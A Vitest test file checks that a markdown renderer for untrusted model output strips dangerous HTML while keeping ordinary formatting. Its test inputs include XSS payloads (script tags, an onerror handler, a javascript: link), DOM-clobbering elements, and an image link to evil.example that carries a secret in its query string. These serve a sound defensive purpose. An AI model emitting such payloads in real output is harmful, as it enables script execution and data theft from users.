// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../src/core/render.js";

describe("rendering untrusted model output", () => {
  it("cannot create app controls or clobber element ids", () => {
    const html = renderMarkdown('<button data-action="purge-history">Click</button> <span data-action="vault-forgot" id="vault-pass" name="x">t</span>');
    expect(html).not.toContain("data-action");
    expect(html).not.toContain("<button");
    expect(html).not.toContain('id="');
  });

  it("strips scripts, images, styles and event handlers", () => {
    const html = renderMarkdown('![x](https://evil.example/?q=secret) <img src=x onerror=alert(1)> <script>alert(1)</script> <a href="javascript:alert(1)" onclick="x()">l</a> <p style="color:red">p</p>');
    expect(html).not.toMatch(/<img|<script|onerror|onclick|javascript:|style=/i);
  });

  it("keeps ordinary formatting and makes links safe", () => {
    const html = renderMarkdown("**Cap**: £2,500,000\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n[site](https://example.com)");
    expect(html).toContain("<strong>Cap</strong>");
    expect(html).toContain("<table>");
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });
});
